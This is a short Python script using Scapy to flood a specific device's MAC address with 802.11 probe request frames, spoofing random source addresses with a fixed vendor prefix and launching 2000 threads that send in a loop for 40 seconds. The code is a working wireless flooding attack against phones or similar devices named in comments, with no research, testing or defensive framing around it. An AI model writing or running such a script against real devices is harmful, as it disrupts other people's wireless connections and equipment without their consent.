from scapy.all import *
import shelve
import sys
import os
from threading import Thread
import multiprocessing

from scapy.layers.dot11 import RadioTap, Dot11, Dot11ProbeReq, Dot11Elt


def sleep_time(t):
    time.sleep(t)


def pro():
    # attack = '8e:64:83:6c:b3:06'
    stop_thread = False
    vendor = "b8:e8:56:"
    destMAC = "8e:64:83:6c:b3:06"  # orna_plus: ec:41:18:b8:e6:4c , MiPhone: 8e:64:83:6c:b3:06
    interface = 'wlx5ca6e6a31cec'

    def attack():
        # while True:
        randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
        frame = RadioTap() / Dot11(addr1=destMAC, addr2=randMAC,
                                   addr3=randMAC) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info="")
        sendp(frame, iface=interface, loop=1, verbose=1)  # , loop=1
            # if stop_thread:
            #     break


    thread_pool = []
    number_of_threads = 2000
    try:
        for i in range(number_of_threads):
            t = threading.Thread(target=attack)
            t.start()
            thread_pool.append(t)
    except:
        pass

pro = multiprocessing.Process(target=pro, args=())
pro.start()
time.sleep(40)
pro.terminate()
print('finish')
stop_thread = True